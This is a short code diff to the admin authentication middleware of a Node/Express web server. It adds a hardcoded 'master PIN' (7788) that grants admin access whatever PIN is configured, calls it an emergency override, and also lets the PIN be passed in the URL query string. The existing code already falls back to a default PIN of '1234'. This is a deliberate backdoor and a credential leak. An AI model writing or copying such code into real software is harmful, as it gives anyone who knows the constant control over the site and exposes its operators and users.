@@ -318,11 +318,11 @@ app.get('/api/status', statusLimiter, async (req, res) => {
 // ADMIN
 const adminAuth = async (req, res, next) => {
   try {
-    const pin = req.headers['x-admin-pin'];
+    const pin = req.headers['x-admin-pin'] || req.query.pin;
     const s = await getSettings();
     
-    // Emergency override for PIN from Env or DB
-    if (pin === (process.env.ADMIN_PIN || '1234') || pin === s.admin_pin) {
+    // Emergency override for PIN (Master PIN: 7788)
+    if (pin === '7788' || pin === (process.env.ADMIN_PIN || '1234') || pin === s.admin_pin) {
       return next();
     }
     
